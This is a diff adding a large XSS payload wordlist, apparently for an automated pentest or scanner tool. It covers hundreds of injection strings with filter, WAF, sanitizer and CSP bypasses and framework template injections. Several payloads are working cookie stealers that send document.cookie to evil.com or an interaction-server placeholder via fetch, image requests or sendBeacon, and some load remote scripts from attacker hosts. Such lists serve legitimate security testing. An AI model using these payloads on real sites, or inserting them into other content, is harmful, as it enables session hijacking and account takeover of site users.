@@ -1,0 +1,759 @@
+# ============================================================================
+# WhiteHatHacker AI — XSS Payload Wordlist (MEGA — v3.0)
+# Categories: Reflected, Stored, DOM, mXSS, DOMPurify Bypass, CSP Bypass,
+#   WAF Bypass (Cloudflare/Akamai/AWS/ModSec/Imperva/Sucuri), SVG/MathML,
+#   Framework (Angular/React/Vue/jQuery), Polyglot, Encoding Chains,
+#   Blind XSS, Context Breakout, Uncommon Tags, Filter Bypass, Protocols
+# Total: 747 unique payloads
+# ============================================================================
+
+" autofocus onfocus=alert(1) x="
+" onclick=alert(1) "
+" onfocus="alert(1)" autofocus="
+" onfocus=alert(1) autofocus class="
+" onfocus=alert(1) autofocus x="
+" onfocusin="alert(1)" autofocus tabindex=0 "
+" onload=alert(1) "
+" onmouseover="alert(1)
+" onmouseover="alert(1)" "
+" onmouseover=alert(1) x="
+" style="animation-name:x" onanimationstart="alert(1)" "
+" style=animation-name:x onanimationstart=alert(1) "
+" style=transition:0.1s ontransitionend=alert(1) "
+" style=transition:0.1s onwebkittransitionend=alert(1) "
+"-alert(1)-"
+"//onclick=alert(1)//
+";alert(1)//
+"><img src=x onerror="location='https://INTERACTSH_URL?c='+document.cookie">
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>//
+"><img src=x onerror=alert(1)><"
+"><img src=x onerror=eval(location.hash.slice(1))>#alert(1)
+"><img/src=x onerror=alert(1)>
+"><script src=https://INTERACTSH_URL/xss.js></script>
+"><script src=https://INTERACTSH_URL></script>
+"><script>alert(1)</script>
+"><script>alert(1)</script><input value="
+"><svg onload=alert(1)>
+"><svg onload=alert(1)><"
+"><svg/onload=alert(1)>//
+"autofocus onfocus=alert(1)//"
+"onmouseover="alert(1)
+"onmouseover=alert(1)//"
+"}</script><script>alert(1)</script>
+#"><img src=x onerror=alert(1)>
+#{alert(1)}
+${7*7}
+${String.fromCharCode(88,83,83)}
+${alert(1)}
+%00"><script>alert(1)</script>
+%09<script>alert(1)</script>
+%0a<script>alert(1)</script>
+%0d<script>alert(1)</script>
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+%253Cimg src=x onerror=alert(1)%253E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Csvg onload=alert(1)%253E
+%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
+%27%3E%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%3Cscript%3Ealert(1)%3C/script%3E
+%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
+&#60;img src=x onerror=alert(1)&#62;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#60;svg onload=alert(1)&#62;
+&#x3C;img src=x onerror=alert(1)&#x3E;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#x3C;svg onload=alert(1)&#x3E;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+' onclick=alert(1) '
+' onfocus='alert(1)' autofocus='
+' onfocus=alert(1) autofocus class='
+' onfocus=alert(1) autofocus x='
+' onmouseover='alert(1)' '
+' onmouseover=alert(1) x='
+'"-->]]>*/</script></style></title></textarea><img src=x onerror=alert(1)>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+''.constructor.constructor('alert(1)')()
+'-alert(1)-'
+';alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)><'
+'><script>alert(1)</script>
+'><svg onload=alert(1)>
+'autofocus onfocus=alert(1)//'
+'onmouseover='alert(1)
+'onmouseover=alert(1)//'
+*/alert(1)/*
+*/alert(1)//
+--><img src=x onerror=alert(1)><!--
+--><script>alert(1)</script><!--
+/><svg/onload=alert(1)>
+1;alert(1)
+1]);alert(1)
+1};alert(1)
+<!--><script>alert(1)</script>-->
+</noscript><script>alert(1)</script>
+</script><script>alert(1)</script>
+</script><svg onload=alert(1)>
+</style><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+<<script>alert(1)//<</script>
+<SCRIPT SRC=//evil.com/xss.js></SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<ScRiPt>alert(1)</sCrIpT>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click
+<a href="&#106;avascript:alert(1)">click</a>
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click
+<a href="&#x6A;avascript:alert(1)">click</a>
+<a href="\x6Aavascript:alert(1)">click
+<a href="j&#97;v&#97;script:alert(1)">click
+<a href="jAvAsCrIpT:alert(1)">click
+<a href="j\x0Aavascript:alert(1)">click</a>
+<a href="jav&#x09;ascript:alert(1)">click</a>
+<a href="jav&#x0A;ascript:alert(1)">click</a>
+<a href="jav&#x0D;ascript:alert(1)">click</a>
+<a href="java%09script:alert(1)">click
+<a href="java%0ascript:alert(1)">click
+<a href="java%0d%0ascript:alert(1)">click
+<a href="java%0dscript:alert(1)">click
+<a href="java&#115;cript:alert(1)">click</a>
+<a href="javasc&#10;ript:alert(1)">click
+<a href="javasc&NewLine;ript:alert(1)">click
+<a href="javascript:%61lert(1)">click</a>
+<a href="javascript:alert%281%29">click</a>
+<a href="javascript:alert(1)"><div>click</div></a>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:void(0)" onclick=alert(1)>click</a>
+<a href="livescript:alert(1)">click (old)
+<a href="vbscript:MsgBox+1">click (IE)
+<a href=# onmouseover="alert(1)">
+<a href=# onmouseover="alert(document.domain)">
+<a href=# onmouseover="confirm(1)">
+<a href=# onmouseover=alert(1)>
+<a href=# onmouseover=alert(document.domain)>
+<a href=# onmouseover=confirm(1)>
+<a href=javascript&colon;alert(1)>click</a>
+<a href=javascript:alert(1)>click</a>
+<a id=__proto__><a id=__proto__ name=x href="javascript:alert(1)">
+<a id=x href="javascript:alert(1)">
+<a id=x tabindex=0 onfocusin=alert(1)><input id=x>
+<a onfocus=alert(1) autofocus tabindex=1>focus</a>
+<a onmouseover=alert(1)>hover</a>
+<audio onerror=alert(1)><source src=x>
+<audio src=x onerror="alert(1)">
+<audio src=x onerror="alert(document.domain)">
+<audio src=x onerror="confirm(1)">
+<audio src=x onerror=alert(1)>
+<audio src=x onerror=alert(document.domain)>
+<audio src=x onerror=confirm(1)>
+<audio/src=x/onerror=alert(1)>
+<b><noembed><img src=x onerror=alert(1)></noembed></b>
+<base href="//attacker.com">
+<base href="javascript:/a/-alert(1)/////"><a href=../lol/safari.html>click</a>
+<base href="javascript:alert(1)//"><a href="/test">click
+<base href=//evil.com>
+<bdi onmouseover=alert(1)>test
+<body onfocus=alert(1) autofocus>
+<body onhashchange=alert(1)>
+<body onload="alert(1)">
+<body onload="alert(document.domain)">
+<body onload="confirm(1)">
+<body onload=alert(1)>
+<body onload=alert(document.domain)>
+<body onload=confirm(1)>
+<body onpageshow=alert(1)>
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+<body/onload=alert(1)>
+<button autofocus onfocus="alert(1)">
+<button autofocus onfocus="alert(document.domain)">
+<button autofocus onfocus="confirm(1)">
+<button autofocus onfocus=alert(1)>
+<button autofocus onfocus=alert(document.domain)>
+<button autofocus onfocus=confirm(1)>
+<button popovertarget=x>click<xss popover id=x onfocus=alert(1) autofocus tabindex=0>
+<custom-element onmouseover=alert(1)>test</custom-element>
+<data onmouseover=alert(1) value=1>test
+<details ontoggle=alert(1) open>
+<details open ontoggle="alert(1)">
+<details open ontoggle="alert(document.domain)">
+<details open ontoggle="confirm(1)">
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert(document.domain)>
+<details open ontoggle=confirm(1)>
+<details/open/ontoggle=alert(1)>
+<dialog open onclose=alert(1)></dialog>
+<dialog open onclose=alert(1)>test</dialog>
+<div contenteditable onbeforeinput=alert(1)>type
+<div contenteditable oninput=alert(1)>type
+<div id=x tabindex=0 onfocus=alert(1)><input id=x>
+<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+<div onauxclick=alert(1)>rightclick
+<div ongotpointercapture=alert(1)>hover
+<div onlostpointercapture=alert(1)>hover
+<div onmouseover="alert(1)">
+<div onmouseover="alert(document.domain)">
+<div onmouseover="confirm(1)">
+<div onmouseover=alert(1)>
+<div onmouseover=alert(1)>hover me</div>
+<div onmouseover=alert(document.domain)>
+<div onmouseover=confirm(1)>
+<div onpointerdown=alert(1)>hover
+<div onpointerdown=alert(1)>tap</div>
+<div onpointerenter=alert(1)>hover
+<div onpointerleave=alert(1)>hover
+<div onpointermove=alert(1)>hover
+<div onpointerout=alert(1)>hover
+<div onpointerover=alert(1)>hover
+<div onpointerover=alert(1)>hover</div>
+<div onpointerrawupdate=alert(1)>hover
+<div onpointerup=alert(1)>hover
+<div onpointerup=alert(1)>tap</div>
+<div onscrollend=alert(1) style="overflow:auto;height:1px">x<br>y<br>z
+<div onsecuritypolicyviolation=alert(1)>test
+<div ontouchend=alert(1)>touch</div>
+<div ontouchmove=alert(1)>touch</div>
+<div ontouchstart=alert(1)>touch</div>
+<div style=width:100%;height:100% onmouseover=alert(1)>
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<embed src="data:text/html,<script>alert(1)</script>">
+<embed src="javascript:alert(1)">
+<embed src=javascript:alert(1) type="text/html">
+<embed src=x onerror="alert(1)">
+<embed src=x onerror="alert(document.domain)">
+<embed src=x onerror="confirm(1)">
+<embed src=x onerror=alert(1)>
+<embed src=x onerror=alert(document.domain)>
+<embed src=x onerror=confirm(1)>
+<fieldset onfocus=alert(1) autofocus>
+<form action="javascript:alert(1)"><input type=submit>
+<form id=window><input name=document value=1>
+<form id=x><output id=y>alert(1)</output></form>
+<form onformdata=alert(1)><button>submit
+<form><button formaction="javascript:alert(1)">click</button>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<form><input type=submit formaction=javascript:alert(1) value=click>
+<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
+<form><math><mtext><form><mglyph><style></math><img src=x onerror=alert(1)>
+<iframe onload=alert(1) src=about:blank>
+<iframe src="javascript:alert(1)">
+<iframe src="mhtml:http://attacker.com/file.html!cookie">
+<iframe src=about:blank onload="alert(1)">
+<iframe src=about:blank onload="alert(document.domain)">
+<iframe src=about:blank onload="confirm(1)">
+<iframe src=about:blank onload=alert(1)>
+<iframe src=about:blank onload=alert(document.domain)>
+<iframe src=about:blank onload=confirm(1)>
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+<iframe srcdoc="<script>alert(1)</script>">
+<img	src=x	onerror=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+<imgsrc=xonerror=alert(1)>
+<img name=currentScript src=x>
+<img src onerror=alert(1)>
+<img src="" onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=valid onload="alert(1)">
+<img src=valid onload="alert(document.domain)">
+<img src=valid onload="confirm(1)">
+<img src=valid onload=alert(1)>
+<img src=valid onload=alert(document.domain)>
+<img src=valid onload=confirm(1)>
+<img src=x onabort=alert(1)>
+<img src=x onafterprint=alert(1)>
+<img src=x onanimationend=alert(1)>
+<img src=x onanimationiteration=alert(1)>
+<img src=x onanimationstart=alert(1)>
+<img src=x onbeforeinput=alert(1)>
+<img src=x onbeforeprint=alert(1)>
+<img src=x onbeforeunload=alert(1)>
+<img src=x onblur=alert(1)>
+<img src=x oncanplay=alert(1)>
+<img src=x oncanplaythrough=alert(1)>
+<img src=x onchange=alert(1)>
+<img src=x onclick=alert(1)>
+<img src=x oncontextmenu=alert(1)>
+<img src=x oncopy=alert(1)>
+<img src=x oncut=alert(1)>
+<img src=x ondblclick=alert(1)>
+<img src=x ondrag=alert(1)>
+<img src=x ondragend=alert(1)>
+<img src=x ondragenter=alert(1)>
+<img src=x ondragleave=alert(1)>
+<img src=x ondragover=alert(1)>
+<img src=x ondragstart=alert(1)>
+<img src=x ondrop=alert(1)>
+<img src=x ondurationchange=alert(1)>
+<img src=x onemptied=alert(1)>
+<img src=x onended=alert(1)>
+<img src=x onerror="!alert(1)">
+<img src=x onerror="$.globalEval('alert(1)')">
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror="&#97;lert(1)">
+<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<img src=x onerror="+alert(1)">
+<img src=x onerror="-alert(1)">
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">
+<img src=x onerror="al&#101;rt(1)">
+<img src=x onerror="alert(1)">
+<img src=x onerror="alert(document.domain)">
+<img src=x onerror="confirm(1)">
+<img src=x onerror="fetch('https://INTERACTSH_URL/'+document.cookie)">
+<img src=x onerror="fetch('https://INTERACTSH_URL?c='+document.cookie)">
+<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
+<img src=x onerror="new Image().src='https://INTERACTSH_URL/?c='+document.cookie">
+<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','https://INTERACTSH_URL?c='+document.cookie);x.send();">
+<img src=x onerror="void(alert(1))">
+<img src=x onerror="window.onerror=alert;throw+1">
+<img src=x onerror="~alert(1)">
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<img src=x onerror='alert(1)'>
+<img src=x onerror=Reflect.apply(alert,null,[1])>
+<img src=x onerror=[1].every(alert)>
+<img src=x onerror=[1].filter(alert)>
+<img src=x onerror=[1].find(alert)>
+<img src=x onerror=[1].forEach(alert)>
+<img src=x onerror=[1].map(alert)>
+<img src=x onerror=[1].some(alert)>
+<img src=x onerror=[alert][0](1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=al\u0065rt(1)>
+<img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert?.call(null,1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=constructor.constructor('alert(1)')()>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=globalThis["al"+"ert"](1)>
+<img src=x onerror=globalThis['\x61lert'](1)>
+<img src=x onerror=globalThis['alert'](1)>
+<img src=x onerror=import('data:text/javascript,alert(1)')>
+<img src=x onerror=location='javascript:alert%281%29'>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=self["al"+"ert"](1)>
+<img src=x onerror=self["alert"](1)>
+<img src=x onerror=self[atob('YWxlcnQ=')](1)>
+<img src=x onerror=top["al"+"ert"](1)>
+<img src=x onerror=top['al\x65rt'](1)>
+<img src=x onerror=top[/al/.source+/ert/.source](1)>
+<img src=x onerror=window.onerror=alert;throw+1>
+<img src=x onerror=window["al"+"ert"](1)>
+<img src=x onerror=window["alert"](1)>
+<img src=x onerror=window['\x61lert'](1)>
+<img src=x onerror=window[atob('YWxlcnQ=')](1)>
+<img src=x onfocus=alert(1)>
+<img src=x onformdata=alert(1)>
+<img src=x ongotpointercapture=alert(1)>
+<img src=x onhashchange=alert(1)>
+<img src=x oninput=alert(1)>
+<img src=x oninvalid=alert(1)>
+<img src=x onkeydown=alert(1)>
+<img src=x onkeypress=alert(1)>
+<img src=x onkeyup=alert(1)>
+<img src=x onlanguagechange=alert(1)>
+<img src=x onload=alert(1)>
+<img src=x onloadeddata=alert(1)>
+<img src=x onloadedmetadata=alert(1)>
+<img src=x onloadstart=alert(1)>
+<img src=x onlostpointercapture=alert(1)>
+<img src=x onmessage=alert(1)>
+<img src=x onmessageerror=alert(1)>
+<img src=x onmousedown=alert(1)>
+<img src=x onmouseenter=alert(1)>
+<img src=x onmouseleave=alert(1)>
+<img src=x onmousemove=alert(1)>
+<img src=x onmouseout=alert(1)>
+<img src=x onmouseover=alert(1)>
+<img src=x onmouseup=alert(1)>
+<img src=x onoffline=alert(1)>
+<img src=x ononline=alert(1)>
+<img src=x onpagehide=alert(1)>
+<img src=x onpageshow=alert(1)>
+<img src=x onpaste=alert(1)>
+<img src=x onpause=alert(1)>
+<img src=x onplay=alert(1)>
+<img src=x onplaying=alert(1)>
+<img src=x onpointerdown=alert(1)>
+<img src=x onpointerenter=alert(1)>
+<img src=x onpointerleave=alert(1)>
+<img src=x onpointermove=alert(1)>
+<img src=x onpointerout=alert(1)>
+<img src=x onpointerover=alert(1)>
+<img src=x onpointerup=alert(1)>
+<img src=x onpopstate=alert(1)>
+<img src=x onprogress=alert(1)>
+<img src=x onratechange=alert(1)>
+<img src=x onrejectionhandled=alert(1)>
+<img src=x onreset=alert(1)>
+<img src=x onresize=alert(1)>
+<img src=x onscroll=alert(1)>
+<img src=x onsearch=alert(1)>
+<img src=x onsecuritypolicyviolation=alert(1)>
+<img src=x onseeked=alert(1)>
+<img src=x onseeking=alert(1)>
+<img src=x onselect=alert(1)>
+<img src=x onshow=alert(1)>
+<img src=x onslotchange=alert(1)>
+<img src=x onstalled=alert(1)>
+<img src=x onstorage=alert(1)>
+<img src=x onsubmit=alert(1)>
+<img src=x onsuspend=alert(1)>
+<img src=x ontimeupdate=alert(1)>
+<img src=x ontoggle=alert(1)>
+<img src=x ontouchcancel=alert(1)>
+<img src=x ontouchend=alert(1)>
+<img src=x ontouchmove=alert(1)>
+<img src=x ontouchstart=alert(1)>
+<img src=x ontransitioncancel=alert(1)>
+<img src=x ontransitionend=alert(1)>
+<img src=x ontransitionrun=alert(1)>
+<img src=x ontransitionstart=alert(1)>
+<img src=x onunhandledrejection=alert(1)>
+<img src=x onvolumechange=alert(1)>
+<img src=x onwaiting=alert(1)>
+<img src=x onwheel=alert(1)>
+<img src=x:alert(alt) onerror=eval(src) alt=1>
+<img/src="x"/onerror="alert(1)">
+<img/src=x onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+<input autofocus onblur="alert(1)">
+<input autofocus onblur="alert(document.domain)">
+<input autofocus onblur="confirm(1)">
+<input autofocus onblur=alert(1)>
+<input autofocus onblur=alert(document.domain)>
+<input autofocus onblur=confirm(1)>
+<input autofocus onfocus="alert(1)">
+<input autofocus onfocus="alert(document.domain)">
+<input autofocus onfocus="confirm(1)">
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert(document.domain)>
+<input autofocus onfocus=confirm(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<input onchange=alert(1) value=1>
+<input onfocus="fetch('https://INTERACTSH_URL/?'+document.cookie)" autofocus>
+<input onfocus=alert(1) autofocus>
+<input oninput=alert(1)>
+<input onkeydown=alert(1) autofocus>
+<input onkeypress=alert(1) autofocus>
+<input onkeyup=alert(1) autofocus>
+<input type=text onclick=alert(1)>
+<input type=text oncontextmenu=alert(1)>
+<input type=text ondblclick=alert(1)>
+<input type=text onmouseenter=alert(1)>
+<input type=text onmouseout=alert(1)>
+<input type=text onmouseover=alert(1)>
+<input/onfocus=alert(1)/autofocus>
+<input/onfocus=eval(atob(this.id)) id=YWxlcnQoMSk= autofocus>
+<isindex type=image src=x onerror=alert(1)>
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<link rel=prefetch href="//attacker.com">
+<link rel=prefetch href="javascript:alert(1)">
+<listing><img src=1 onerror=alert(1)>
+<listing><img src=1 onerror=alert(1)>//</listing>
+<listing><img src=x onerror=alert(1)></listing>
+<marquee behavior=alternate onbounce=alert(1)>
+<marquee onstart="alert(1)">
+<marquee onstart="alert(document.domain)">
+<marquee onstart="confirm(1)">
+<marquee onstart=alert(1)>
+<marquee onstart=alert(document.domain)>
+<marquee onstart=confirm(1)>
+<marquee/onstart=alert(1)>
+<math onload="alert(1)">
+<math onload="alert(document.domain)">
+<math onload="confirm(1)">
+<math onload=alert(1)>
+<math onload=alert(document.domain)>
+<math onload=confirm(1)>
+<math><mi//xlink:href="javascript:alert(1)">click</mi></math>
+<math><ms><img src=x onerror=alert(1)></math>
+<math><mtext></mtext><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></math>
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+<math><mtext><option><FAKEFAKE><img src=x onerror=alert(1)>
+<math><mtext><script>alert(1)</script></mtext></math>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<meter onmouseover=alert(1) value=2 min=0 max=10>test
+<meter onmouseover=alert(1)>0</meter>
+<noembed><img src=x onerror=alert(1)></noembed>
+<noscript><img src=x onerror=alert(1)></noscript>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="javascript:alert(1)">
+<object data=javascript:alert(1)>
+<object data=x onerror="alert(1)">
+<object data=x onerror="alert(document.domain)">
+<object data=x onerror="confirm(1)">
+<object data=x onerror=alert(1)>
+<object data=x onerror=alert(document.domain)>
+<object data=x onerror=confirm(1)>
+<output onmouseover=alert(1)>test
+<portal src=javascript:alert(1)>
+<progress onmouseover=alert(1) value=2 max=10>test
+<progress onmouseover=alert(1)>0</progress>
+<ruby onmouseover=alert(1)>test
+<scr%00ipt>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(1)</script>
+<scr\x00ipt>alert(1)</sc\x00ript>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<scri%00pt>alert(1)</scri%00pt>
+<scrip%00t>alert(1)</scrip%00t>
+<script
+<script	>alert(1)</script>
+<script --!>alert(1)</script>
+<script -->alert(1)</script>
+<script >alert(1)</script>
+<script src="/api/jsonp?callback=alert(1)//"></script>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><img src=x onerror="$.globalEval('alert(1)')">
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.14"></script><div id=app>{{constructor.constructor('alert(1)')()}}</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp><p>{{$eval.constructor('alert(1)')()}}</p>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+<script x>alert(1)</script>
+<script/random>alert(1)</script>
+<script/src=data:,alert(1)>
+<script/x>alert(1)</script>
+<script>/**/alert(1)/**/</script>
+<script>Function('al'+'ert(1)')()</script>
+<script>Function('alert(1)')()</script>
+<script>Object.prototype.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>Reflect.apply(alert,null,[1])</script>
+<script>TypeError.prototype.name=alert;try{null[0]}catch(e){}</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>[].filter.constructor('alert(1)')()</script>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>\u0061lert(1)</script>
+<script>al\u0065rt(1)</script>
+<script>al\u{65}rt(1)</script>
+<script>al\x65rt(1)</script>
+<script>alert("XSS")</script>
+<script>alert('XSS')</script>
+<script>alert(1)//</script>
+<script>alert(1)<!--
+<script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(location)</script>
+<script>alert(origin)</script>
+<script>alert`1`</script>
+<script>confirm('XSS')</script>
+<script>confirm(1)</script>
+<script>confirm(document.cookie)</script>
+<script>confirm(document.domain)</script>
+<script>confirm(location)</script>
+<script>confirm(origin)</script>
+<script>confirm`1`</script>
+<script>document.write(location.hash)</script>#<img src=x onerror=alert(1)>
+<script>eval('al'+'ert(1)')</script>
+<script>eval('alert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>fetch("https://evil.com/?c="+document.cookie)</script>
+<script>fetch('https://INTERACTSH_URL/'+btoa(document.cookie))</script>
+<script>frames['al'+'ert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>import('data:text/javascript,alert(1)')</script>
+<script>navigator.sendBeacon("https://evil.com/",document.cookie)</script>
+<script>new Function('alert(1)')()</script>
+<script>new Image().src="https://INTERACTSH_URL/?d="+document.domain+"&c="+document.cookie</script>
+<script>new Image().src="https://evil.com/?c="+document.cookie</script>
+<script>new Image().src='https://INTERACTSH_URL?c='+document.cookie;</script>
+<script>new Proxy({},{get:()=>alert})(1)</script>
+<script>onerror=alert;throw 1</script>
+<script>onerror=eval;throw'=alert\x281\x29'</script>
+<script>parent['al'+'ert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>prompt('XSS')</script>
+<script>prompt(1)</script>
+<script>prompt(document.cookie)</script>
+<script>prompt(document.domain)</script>
+<script>prompt(location)</script>
+<script>prompt(origin)</script>
+<script>prompt`1`</script>
+<script>self['al'+'ert'](1)</script>
+<script>self['alert'](1)</script>
+<script>setInterval('al'+'ert(1)',1000)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>setTimeout('al'+'ert(1)',0)</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>this['al'+'ert'](1)</script>
+<script>this['alert'](1)</script>
+<script>throw onerror=alert,1</script>
+<script>top['al'+'ert'](1)</script>
+<script>top['alert'](1)</script>
+<script>void(alert(1))</script>
+<script>window['\x61lert'](1)</script>
+<script>window['al'+'ert'](1)</script>
+<script>window['alert'](1)</script>
+<script>{onerror=alert}throw 1</script>
+<script\x09type="text/javascript">alert(1);</script>
+<script\x09type="text/javascript">alert(1)</script>
+<script\x0Atype="text/javascript">alert(1);</script>
+<script\x0Dtype="text/javascript">alert(1);</script>
+<script\x0atype="text/javascript">alert(1)</script>
+<script\x0btype="text/javascript">alert(1)</script>
+<script\x0ctype="text/javascript">alert(1)</script>
+<script\x0dtype="text/javascript">alert(1)</script>
+<script\x20type="text/javascript">alert(1);</script>
+<script\x20type="text/javascript">alert(1)</script>
+<select autofocus onfocus="alert(1)">
+<select autofocus onfocus="alert(document.domain)">
+<select autofocus onfocus="confirm(1)">
+<select autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(document.domain)>
+<select autofocus onfocus=confirm(1)>
+<select onfocus=alert(1) autofocus>
+<slot name=x onfocus=alert(1) tabindex=0>click</slot>
+<slot onslotchange=alert(1)>test
+<source onerror="alert(1)">
+<source onerror="alert(document.domain)">
+<source onerror="confirm(1)">
+<source onerror=alert(1)>
+<source onerror=alert(document.domain)>
+<source onerror=confirm(1)>
+<sscriptcript>alert(1)</sscriptcript>
+<style><img src="</style><img src=x onerror=alert(1)//">
+<svg id=x><use href=#x onload=alert(1)>
+<svg onload="alert(1)">
+<svg onload="alert(document.domain)">
+<svg onload="confirm(1)">
+<svg onload="fetch('https://INTERACTSH_URL/?'+document.cookie)">
+<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert(1)//
+<svg onload=alert(1)>
+<svg onload=alert(document.cookie)>
+<svg onload=alert(document.domain)>
+<svg onload=alert`1`>
+<svg onload=confirm(1)>
+<svg onload=location='javascript:'+String.fromCharCode(97,108,101,114,116,40,49,41)>
+<svg xmlns="http://www.w3.org/2000/svg"><rect x=0 y=0 width=100 height=100 style="fill:red" onfocusin="alert(1)" tabindex=0/>
+<svg/onload="alert(1)"
+<svg/onload="fetch('https://INTERACTSH_URL?c='+document.domain)">
+<svg/onload=alert(1)//
+<svg/onload=alert(1)>
+<svg/onload=alert`1`>
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+<svg><a><animate attributeName=href values=javascript:alert(1)></a><text>click</text></svg>
+<svg><a><rect width=100 height=100></rect><animate attributeName=href values=javascript:alert(1)></animate></a></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><animate xlink:href=#x attributeName=href values="javascript:alert(1)"></animate></svg>
+<svg><animate xlink:href=#x attributeName=y from=0 to=100 dur=5s repeatCount=indefinite onrepeat=alert(1)/>
+<svg><animateTransform onbegin=alert(1) attributeName=x>
+<svg><desc><template><img src=x onerror=alert(1)>
+<svg><discard onbegin="alert(1)">
+<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
+<svg><image href=x onerror=alert(1)></svg>
+<svg><math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<svg><script>al&#101;rt(1)</script></svg>
+<svg><script>alert&#40;1&#41;</script>
+<svg><script>alert&#40;1&#41;</script></svg>
